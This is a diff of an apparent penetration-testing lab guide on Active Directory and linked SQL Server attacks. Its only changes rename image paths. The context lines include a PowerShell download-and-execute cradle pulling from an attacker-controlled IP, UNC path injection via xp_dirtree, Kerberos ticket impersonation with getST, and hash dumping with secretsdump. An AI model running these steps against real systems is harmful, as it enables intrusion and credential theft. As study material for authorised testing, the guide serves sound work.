@@ -320,7 +320,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
 
 * Now we can paste the base64 encoded string in the following SQL query which will execute the base64 encoded PowerShell command:
 
@@ -351,7 +351,7 @@ One of the privilege escalation techniques that you don't see too often is by us
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
 
 2\. The `MachineAccountQouta` is 10, meaning we (all authenticated users) can create our own computerobjects in the domain. So lets add our own computerobject, this can be done with [PowerMad](https://github.com/Kevin-Robertson/Powermad). First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
@@ -509,7 +509,7 @@ For this to work you will need to fill in the IP of your kali machine, which nee
 SELECT * FROM master..sysservers;
 ```
 
-![](<../../../.gitbook/assets/image (71) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1).png>)
 
 3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server for the SQL server version with the following query, using the openquery functionality:
 
@@ -545,7 +545,7 @@ SQL Servers by default runs as a local service under the context of the computer
 sudo responder -I tun0
 ```
 
-![](<../../../.gitbook/assets/image (69) (1) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1) (1).png>)
 
 2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:
 
@@ -751,7 +751,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-
 getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (71).png>)
+![](<../../../.gitbook/assets/image (71) (1).png>)
 
 Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
 
@@ -792,7 +792,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/Seatbelt.exe","C:\users\publi
 
 2\. In the output of the section WindowsCredentialFiles we can see that the user `sa_sql` has some credentials saved:
 
-![](<../../../.gitbook/assets/image (17).png>)
+![](<../../../.gitbook/assets/image (17) (1).png>)
 
 4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:
 
@@ -921,7 +921,7 @@ secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaa
 
 7\. We retrieved the Administrator hash and can authenticate as `Domain Admin` to the Domain Controller `DC03` of `Secure.local`.
 
-![](<../../../.gitbook/assets/image (69) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1).png>)
 
 ### 13. Kerberoast
 
